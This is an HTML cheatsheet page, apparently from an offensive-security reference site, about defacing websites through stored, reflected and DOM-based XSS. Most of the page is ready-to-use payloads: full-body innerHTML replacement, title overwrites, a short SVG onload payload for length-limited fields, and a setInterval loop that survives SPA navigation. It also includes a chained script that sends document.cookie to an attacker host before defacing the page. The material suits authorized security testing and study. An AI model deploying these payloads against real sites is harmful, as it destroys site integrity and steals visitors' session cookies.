@@ -1,0 +1,366 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Defacement · ArxOS cheatsheets</title><link rel="stylesheet" href="../../../../codex.css"></head>
+<body><header class="cx-top"><a class="cx-brand" href="../../../../index.html">ArxOS</a><span class="cx-sub">Cheatsheets</span>
+<a class="cx-search-link" href="../../../../index.html#search">Search</a></header>
+<main class="cx-main"><nav class="cx-crumbs"><a href="../../../../index.html">Cheatsheets</a> › Web › XSS</nav><h1>Defacement</h1><p class="cx-lede">Visual disruption of a target page via stored XSS - background color and image manipulation, page title overwrite, body text replacement via innerHTML, and the operational reality that defacement is loud and almost never the actual objective. Defacement is useful as proof-of-impact for stored XSS findings, as hacktivist payload, or as deliberate red-team theatrics; it should never replace the data-theft path that&#x27;s quieter and more valuable.</p><div class="cx-tags"><span class="cx-tag">MITRE T1059.007, T1491, T1491.002</span><span class="cx-tag">D3FEND D3-AH</span><span class="cx-tag">IMPACT Defacement, Integrity</span><span class="cx-tag">OWASP A05</span></div><article class="cx-body"><h2 id="tldr">TL;DR</h2>
+<p>Defacement uses JavaScript executed via stored XSS to overwrite visible elements of a target page - background, title, and body content. Loud by design, useful for proof-of-impact screenshots and hacktivist demonstrations, but operationally inferior to silent data-theft payloads in every other case.</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code># Three primitives, combinable
+&lt;script&gt;document.body.style.background = &quot;#141d2b&quot;&lt;/script&gt;
+&lt;script&gt;document.title = &quot;Owned&quot;&lt;/script&gt;
+&lt;script&gt;document.body.innerHTML = &quot;&lt;h1&gt;Defaced&lt;/h1&gt;&quot;&lt;/script&gt;
+
+# Or one combined payload
+&lt;script&gt;
+  document.body.style.background = &quot;#000&quot;;
+  document.title = &quot;Owned&quot;;
+  document.body.innerHTML = &#x27;&lt;center&gt;&lt;h1 style=&quot;color:red&quot;&gt;DEFACED&lt;/h1&gt;&lt;/center&gt;&#x27;;
+&lt;/script&gt;</code></pre></figure>
+<p>Success indicator: every subsequent visitor to the affected page sees the modified content. For stored XSS the change persists until the underlying database record is cleaned. For reflected XSS it persists only for victims who click the crafted URL.</p>
+<h2 id="when-defacement-is-the-right-tool">When defacement is the right tool</h2>
+<p>Most XSS engagements should <em>not</em> use defacement. The standard payoff path is silent: steal session cookies (see <a href="../../sessions/xss-to-session/index.html">XSS to session</a>), exfiltrate data from authenticated pages, chain into CSRF for state changes (see <a href="../../sessions/xss-csrf-chain/index.html">XSS-CSRF chain</a>). Each is quieter and more valuable.</p>
+<p>Defacement is correct when:</p>
+<table>
+<thead>
+<tr>
+<th>Scenario</th>
+<th>Why defacement</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Bug bounty proof-of-impact</strong></td>
+<td>A screenshot of a defaced page makes the report unambiguous in a way that "I read your <code>document.cookie</code>" doesn't</td>
+</tr>
+<tr>
+<td><strong>Red team noise-generation</strong></td>
+<td>Sometimes the engagement wants the blue team to detect <em>something</em>; defacement is detectable by design</td>
+</tr>
+<tr>
+<td><strong>Hacktivism / authorized public-impact ops</strong></td>
+<td>When the objective explicitly is visible disruption</td>
+</tr>
+<tr>
+<td><strong>Time-limited persistence proof</strong></td>
+<td>"I had write access at 15:42:00 UTC, observe this banner"</td>
+</tr>
+<tr>
+<td><strong>CTF / lab targets with no real users</strong></td>
+<td>No operational downside; impact is the flag-equivalent</td>
+</tr>
+</tbody>
+</table>
+<p>Defacement is wrong when:</p>
+<ul>
+<li>The engagement is data-theft focused (every defacement payload competes with a silent exfil payload)</li>
+<li>Other users will see the defacement and the engagement is meant to be undetected</li>
+<li>Stakeholders haven't authorized "page modified" as an acceptable outcome</li>
+<li>The vulnerable page is heavily monitored (banner / SEO / brand-protection alerting)</li>
+</ul>
+<p>When in doubt, deface a <em>staging</em> clone of the target if you have access, capture the screenshot, and use the silent payload against production.</p>
+<h2 id="the-three-defacement-primitives">The three defacement primitives</h2>
+<h3 id="background-color-or-image">Background color or image</h3>
+<figure class="cx-code"><figcaption>javascript</figcaption><pre><code class="language-javascript">// Solid color
+document.body.style.background = &quot;#141d2b&quot;;
+document.body.style.background = &quot;red&quot;;
+document.body.style.background = &quot;rgb(20, 29, 43)&quot;;
+
+// Image URL
+document.body.background = &quot;https://attacker.example.com/banner.svg&quot;;
+
+// Or CSS shorthand
+document.body.style.cssText = &quot;background:#000 url(http://attacker/x.png) no-repeat center;&quot;;</code></pre></figure>
+<p><code>document.body.style.background</code> is the CSS-style property setter (modern). <code>document.body.background</code> is the legacy HTML attribute (older browsers only, but still supported). Either works for solid disruption. For image-based defacement, the image needs to be hosted somewhere the target's browser can reach - attacker-controlled HTTP server, public image host, or a <code>data:</code> URL embedded inline:</p>
+<figure class="cx-code"><figcaption>javascript</figcaption><pre><code class="language-javascript">// data: URL embeds the image inline; no separate HTTP fetch needed
+document.body.style.backgroundImage = &quot;url(data:image/svg+xml;base64,PHN2Zy...)&quot;;</code></pre></figure>
+<h3 id="page-title">Page title</h3>
+<figure class="cx-code"><figcaption>javascript</figcaption><pre><code class="language-javascript">document.title = &quot;Owned by Squad-X&quot;;</code></pre></figure>
+<p>Affects the browser tab and history. Often the first thing a user notices because tab titles are visible even when the page itself isn't focused. Often missed by attackers because they're focused on body changes.</p>
+<p>For added effect, animate the title:</p>
+<figure class="cx-code"><figcaption>javascript</figcaption><pre><code class="language-javascript">let frames = [&quot;O&quot;, &quot;Ow&quot;, &quot;Own&quot;, &quot;Owne&quot;, &quot;Owned&quot;];
+let i = 0;
+setInterval(() =&gt; { document.title = frames[i++ % frames.length]; }, 500);</code></pre></figure>
+<p>The marquee effect is gratuitous in a real op but characteristic of hacktivist defacement.</p>
+<h3 id="body-content-replacement">Body content replacement</h3>
+<p>The biggest hammer - wipe everything and write your own HTML:</p>
+<figure class="cx-code"><figcaption>javascript</figcaption><pre><code class="language-javascript">document.body.innerHTML = &#x27;&lt;center&gt;&lt;h1 style=&quot;color:red&quot;&gt;Site Hacked&lt;/h1&gt;&lt;/center&gt;&#x27;;</code></pre></figure>
+<p>Replaces every child of <code>&lt;body&gt;</code>. The original page's scripts, forms, navigation - all gone.</p>
+<p>For preserved structure with subtle changes, target a specific element instead:</p>
+<figure class="cx-code"><figcaption>javascript</figcaption><pre><code class="language-javascript">// Target by ID
+document.getElementById(&quot;main-content&quot;).innerHTML = &quot;DEFACED&quot;;
+
+// Target by tag
+document.getElementsByTagName(&quot;h1&quot;)[0].innerHTML = &quot;Owned&quot;;
+
+// jQuery if loaded
+$(&quot;#footer&quot;).html(&quot;Pwned by Squad-X&quot;);
+$(&quot;h1&quot;).html(&quot;DEFACED&quot;);</code></pre></figure>
+<p><code>document.getElementsByTagName("body")[0].innerHTML</code> is equivalent to <code>document.body.innerHTML</code>. The full-body wipe is the most common form.</p>
+<h2 id="combining-the-primitives">Combining the primitives</h2>
+<p>A typical defacement payload combines all three for maximum visual impact:</p>
+<figure class="cx-code"><figcaption>html</figcaption><pre><code class="language-html">&lt;script&gt;
+  // Dark background - common defacement aesthetic
+  document.body.style.background = &quot;#000&quot;;
+  // Title for tab-level visibility
+  document.title = &quot;DEFACED&quot;;
+  // Replace entire body
+  document.body.innerHTML = `
+    &lt;center style=&quot;margin-top:20%&quot;&gt;
+      &lt;h1 style=&quot;color:#f00;font-family:monospace;font-size:80px&quot;&gt;HACKED&lt;/h1&gt;
+      &lt;p style=&quot;color:#fff;font-family:monospace;font-size:24px&quot;&gt;
+        Site security: 0/10. Patch your XSS.&lt;br&gt;
+        - Squad-X | Internet 1969–2024
+      &lt;/p&gt;
+    &lt;/center&gt;
+  `;
+&lt;/script&gt;</code></pre></figure>
+<p>Pre-test the HTML in a local browser before embedding. Once injected, the original page's CSS may not apply (you've replaced the body), so your inline <code>style=</code> attributes need to carry all the styling.</p>
+<h3 id="building-the-payload-via-innerhtml-template">Building the payload via <code>innerHTML</code> template</h3>
+<p>For complex defacement, build the HTML as a multi-line template, then minify into a one-liner for injection:</p>
+<figure class="cx-code"><figcaption>html</figcaption><pre><code class="language-html">&lt;!-- defacement.html - design separately --&gt;
+&lt;center style=&quot;margin-top: 20%; font-family: monospace;&quot;&gt;
+    &lt;h1 style=&quot;color: #f00; font-size: 80px;&quot;&gt;PWNED&lt;/h1&gt;
+    &lt;p style=&quot;color: #fff; font-size: 24px;&quot;&gt;
+        by Squad-X
+    &lt;/p&gt;
+    &lt;img src=&quot;https://attacker.example.com/logo.svg&quot; style=&quot;width: 200px;&quot;&gt;
+&lt;/center&gt;</code></pre></figure>
+<p>Minify:</p>
+<figure class="cx-code"><figcaption>shell</figcaption><pre><code class="language-shell">$ cat defacement.html | tr &#x27;\n&#x27; &#x27; &#x27; | sed &#x27;s/  */ /g&#x27;
+&lt;center style=&quot;margin-top: 20%; font-family: monospace;&quot;&gt; &lt;h1 style=&quot;color: #f00; font-size: 80px;&quot;&gt;PWNED&lt;/h1&gt; &lt;p style=&quot;color: #fff; font-size: 24px;&quot;&gt; by Squad-X &lt;/p&gt; &lt;img src=&quot;https://attacker.example.com/logo.svg&quot; style=&quot;width: 200px;&quot;&gt; &lt;/center&gt;</code></pre></figure>
+<p>Then embed in the payload:</p>
+<figure class="cx-code"><figcaption>html</figcaption><pre><code class="language-html">&lt;script&gt;document.body.innerHTML = &#x27;&lt;center style=&quot;margin-top: 20%; ...&quot;&gt;...&lt;/center&gt;&#x27;;&lt;/script&gt;</code></pre></figure>
+<p>Escape single quotes in the HTML if your wrapper uses them. JavaScript template literals (backticks) handle multi-line HTML cleanly:</p>
+<figure class="cx-code"><figcaption>html</figcaption><pre><code class="language-html">&lt;script&gt;document.body.innerHTML = `&lt;center&gt;...&lt;/center&gt;`;&lt;/script&gt;</code></pre></figure>
+<p>Template literals also let you interpolate <code>${}</code> expressions, useful if you want to embed dynamic content (the victim's IP, the current time, exfiltrated data).</p>
+<h2 id="persistent-defacement-via-stored-xss">Persistent defacement via stored XSS</h2>
+<p>For maximum durability, the payload should be injected into a stored XSS sink (see <a href="../stored/index.html">Stored XSS</a>). Every page render fires the payload again - the defacement appears for every visitor.</p>
+<p>Common stored XSS sinks suitable for defacement:</p>
+<table>
+<thead>
+<tr>
+<th>Sink</th>
+<th>Defacement scope</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Public comment / forum post</td>
+<td>Page-level - every viewer of that thread</td>
+</tr>
+<tr>
+<td>User profile bio rendered on profile pages</td>
+<td>Profile-level - every viewer of that user's profile</td>
+</tr>
+<tr>
+<td>Site-wide banner / announcement (admin-injectable)</td>
+<td>Site-wide - every page of the application</td>
+</tr>
+<tr>
+<td>Header/footer template field</td>
+<td>Site-wide</td>
+</tr>
+<tr>
+<td>Email signature rendered in webmail</td>
+<td>Per-email-view</td>
+</tr>
+</tbody>
+</table>
+<p>Site-wide stored XSS is the textbook defacement-worthy finding. A single XSS into a header template can deface every page of the application until the database record is cleaned.</p>
+<h3 id="removing-the-original-content-first">Removing the original content first</h3>
+<p>Stored XSS payloads often appear inside the original page content (a comment in a comment list). The original page elements around the payload remain visible unless you explicitly remove them:</p>
+<figure class="cx-code"><figcaption>html</figcaption><pre><code class="language-html">&lt;script&gt;
+  // Wipe the original content, then write defacement
+  document.body.innerHTML = &#x27;&lt;h1&gt;DEFACED&lt;/h1&gt;&#x27;;
+&lt;/script&gt;</code></pre></figure>
+<p>If the payload is inside a constrained element (a <code>&lt;div class="comment"&gt;</code>), <code>document.body.innerHTML = ...</code> reaches outside that container and wipes the whole body. The defacement fully replaces the original page.</p>
+<p>For partial defacement (replacing only specific page sections), use targeted DOM manipulation:</p>
+<figure class="cx-code"><figcaption>html</figcaption><pre><code class="language-html">&lt;script&gt;
+  // Hide everything except your defacement target
+  document.querySelectorAll(&quot;nav, header, footer&quot;).forEach(el =&gt; el.style.display = &quot;none&quot;);
+  document.querySelector(&quot;main&quot;).innerHTML = &#x27;&lt;h1&gt;DEFACED&lt;/h1&gt;&#x27;;
+&lt;/script&gt;</code></pre></figure>
+<h2 id="defacement-via-reflected-xss-per-victim-only">Defacement via reflected XSS - per-victim only</h2>
+<p>When the vulnerability is reflected (not stored), defacement only fires for victims who follow the crafted URL. The page isn't actually modified on the server.</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>http://target/search?q=&lt;script&gt;document.body.innerHTML=&#x27;DEFACED&#x27;&lt;/script&gt;</code></pre></figure>
+<p>URL-encoded:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>http://target/search?q=%3Cscript%3Edocument.body.innerHTML%3D%27DEFACED%27%3C%2Fscript%3E</code></pre></figure>
+<p>A reflected-XSS defacement is operationally weaker - it's not really a defacement of the target, it's a defacement of the <em>victim's view</em> of the target. The page hasn't changed for anyone who doesn't follow your URL.</p>
+<p>Useful for:</p>
+<ul>
+<li>Phishing-adjacent attacks where the victim sees a "compromised" version of the page and panics (low-grade social engineering)</li>
+<li>Bug bounty proof of stored-XSS-capable bug class even when only reflected is currently exploitable</li>
+<li>CTF where you control the victim's click anyway</li>
+</ul>
+<p>Not useful for actual public defacement - the target's "real" page is unchanged.</p>
+<h2 id="dom-based-defacement">DOM-based defacement</h2>
+<p>For DOM-based XSS, the same defacement primitives work - the payload runs entirely in the victim's browser:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>http://target/#&lt;script&gt;document.body.innerHTML=&#x27;DEFACED&#x27;&lt;/script&gt;</code></pre></figure>
+<p>The hash-fragment payload never reaches the server, so the server-side logs may not capture the attack. From the defender's perspective, only the rendered page shows the defacement; the underlying HTML/database is clean.</p>
+<p>See <a href="../dom-based/index.html">DOM-based XSS</a> for the source-to-sink methodology that finds these sinks.</p>
+<h2 id="anti-defacement-defenses">Anti-defacement defenses</h2>
+<p>Knowing what defenders deploy tells you what to expect:</p>
+<table>
+<thead>
+<tr>
+<th>Defense</th>
+<th>Effect on defacement</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Content Security Policy <code>script-src 'self'</code></td>
+<td>Blocks <code>&lt;script&gt;</code> injection unless attacker can host on same origin</td>
+</tr>
+<tr>
+<td>Output encoding (<code>htmlspecialchars</code> everywhere)</td>
+<td>Blocks the XSS entirely; no defacement possible</td>
+</tr>
+<tr>
+<td>Sanitizers (DOMPurify, sanitize-html)</td>
+<td>Strips <code>&lt;script&gt;</code> and dangerous attributes from stored content</td>
+</tr>
+<tr>
+<td>Page-integrity monitoring (canary text checks)</td>
+<td>Defenders detect defacement within minutes; rollback automated</td>
+</tr>
+<tr>
+<td>Brand-protection services (Google Safe Browsing)</td>
+<td>Defaced pages get blacklisted; visitors see browser warnings</td>
+</tr>
+</tbody>
+</table>
+<p>These don't matter for the XSS <em>finding</em> - defacement is just one possible payload. They matter for <em>defacement specifically</em>: a target with output encoding has no XSS to deface, and a target with brand-protection has defacement that doesn't reach end users.</p>
+<h2 id="operational-risk-profile">Operational risk profile</h2>
+<p>Defacement payloads create the loudest possible XSS finding:</p>
+<table>
+<thead>
+<tr>
+<th>Detector</th>
+<th>Defacement signal</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>End users</td>
+<td>Highly visible - title changes, content gone, page broken</td>
+</tr>
+<tr>
+<td>Application monitoring (synthetic checks)</td>
+<td>Often catches title/content changes within minutes</td>
+</tr>
+<tr>
+<td>Customer support tickets</td>
+<td>Spike in "site is broken" tickets within hours</td>
+</tr>
+<tr>
+<td>Social media</td>
+<td>"@target your site is hacked" tweets within hours</td>
+</tr>
+<tr>
+<td>Brand monitoring</td>
+<td>Google Alerts, Reddit watch, etc. flag the change</td>
+</tr>
+<tr>
+<td>WAF/IDS</td>
+<td>Modern WAFs detect <code>document.body.innerHTML</code> patterns in request bodies</td>
+</tr>
+<tr>
+<td>Page-integrity systems</td>
+<td>Tripwire-style file integrity / DOM canary checks</td>
+</tr>
+</tbody>
+</table>
+<p>If the engagement requires stealth, do not deface. Even a brief defacement creates evidence: archive.org may snapshot it, customer screenshots may circulate, monitoring systems log it for incident review.</p>
+<h2 id="defacement-payload-variations">Defacement payload variations</h2>
+<h3 id="minimal-for-length-restricted-fields">Minimal - for length-restricted fields</h3>
+<figure class="cx-code"><figcaption>html</figcaption><pre><code class="language-html">&lt;svg onload=document.body.innerHTML=&#x27;PWN&#x27;&gt;</code></pre></figure>
+<p>35 bytes. Fits in most short-field XSS sinks.</p>
+<h3 id="csp-respecting-when-inline-script-is-blocked">CSP-respecting - when inline <code>&lt;script&gt;</code> is blocked</h3>
+<figure class="cx-code"><figcaption>html</figcaption><pre><code class="language-html">&lt;svg onload=&quot;document.body.innerHTML=&#x27;PWN&#x27;&quot;&gt;</code></pre></figure>
+<p>Event handler attribute fires in many CSP-stripping setups (Sanitizer libraries that miss event handlers).</p>
+<h3 id="persistent-setinterval-to-survive-page-navigation-in-spas">Persistent setInterval - to survive page navigation in SPAs</h3>
+<figure class="cx-code"><figcaption>html</figcaption><pre><code class="language-html">&lt;script&gt;
+  setInterval(() =&gt; {
+    document.title = &quot;DEFACED&quot;;
+    if (document.body) document.body.innerHTML = &#x27;&lt;h1&gt;HACKED&lt;/h1&gt;&#x27;;
+  }, 100);
+&lt;/script&gt;</code></pre></figure>
+<p>Re-applies the defacement 10x per second. Useful in Single-Page Applications that re-render the body on route changes - the defacement persists across "page" changes within the SPA.</p>
+<h3 id="defacement-cookie-exfil-chained">Defacement + cookie exfil chained</h3>
+<p>The data-theft + visible-impact combo:</p>
+<figure class="cx-code"><figcaption>html</figcaption><pre><code class="language-html">&lt;script&gt;
+  // Quietly exfiltrate first (don&#x27;t burn opportunity if defacement triggers detection)
+  new Image().src = &quot;http://attacker:8000/?c=&quot; + btoa(document.cookie);
+  // Then deface
+  setTimeout(() =&gt; {
+    document.body.innerHTML = &#x27;&lt;h1&gt;HACKED&lt;/h1&gt;&#x27;;
+  }, 1000);
+&lt;/script&gt;</code></pre></figure>
+<p>The 1-second delay lets the cookie request fly before the visual change triggers user attention.</p>
+<h2 id="quick-reference">Quick reference</h2>
+<table>
+<thead>
+<tr>
+<th>Task</th>
+<th>Pattern</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Change background color</td>
+<td><code>document.body.style.background = "#000"</code></td>
+</tr>
+<tr>
+<td>Change background image</td>
+<td><code>document.body.background = "URL"</code> or <code>document.body.style.backgroundImage = "url(URL)"</code></td>
+</tr>
+<tr>
+<td>Change page title</td>
+<td><code>document.title = "DEFACED"</code></td>
+</tr>
+<tr>
+<td>Replace body content</td>
+<td><code>document.body.innerHTML = "HTML"</code></td>
+</tr>
+<tr>
+<td>Replace specific element</td>
+<td><code>document.getElementById("X").innerHTML = "HTML"</code></td>
+</tr>
+<tr>
+<td>jQuery equivalent</td>
+<td><code>$("body").html("HTML")</code>, <code>$("#x").html("HTML")</code></td>
+</tr>
+<tr>
+<td>Combined defacement</td>
+<td><code>document.body.style.background="#000"; document.title="X"; document.body.innerHTML="HTML"</code></td>
+</tr>
+<tr>
+<td>Minify HTML for inline</td>
+<td><code>cat file.html \| tr '\n' ' ' \| sed 's/  */ /g'</code></td>
+</tr>
+<tr>
+<td>Multi-line HTML in JS</td>
+<td>Use template literals: <code>document.body.innerHTML = `&amp;lt;h1&amp;gt;X&amp;lt;/h1&amp;gt;`</code></td>
+</tr>
+<tr>
+<td>Length-restricted defacement</td>
+<td><code>&lt;svg onload=document.body.innerHTML='X'&gt;</code></td>
+</tr>
+<tr>
+<td>SPA-survival defacement</td>
+<td><code>setInterval</code> re-applying every 100ms</td>
+</tr>
+<tr>
+<td>Exfil + deface combo</td>
+<td>Cookie steal first, defacement on <code>setTimeout</code></td>
+</tr>
+<tr>
+<td>When NOT to deface</td>
+<td>Stealth ops, data-theft engagements, monitored targets, anything that needs to stay undetected</td>
+</tr>
+</tbody>
+</table>
+<p>For the data-theft path that's usually the better choice, see <a href="../../sessions/xss-to-session/index.html">XSS to session</a>. For impersonation attacks via fake login forms (the other common XSS attack pattern), see <a href="../phishing-injection/index.html">Phishing injection</a>. For getting the XSS payload into the page in the first place, see <a href="../reflected/index.html">Reflected</a>, <a href="../stored/index.html">Stored</a>, and <a href="../dom-based/index.html">DOM-based</a>.</p></article><nav class="cx-pager"><a class="cx-prev" href="../dom-based/index.html">Previous: DOM-based XSS</a><a class="cx-next" href="../phishing-injection/index.html">Next: Phishing Injection</a></nav></main>
+<footer class="cx-foot"><p>For authorized testing and study only. <a href="../../../../license.html">License</a></p></footer>
+<script src="../../../../codex.js"></script></body></html>
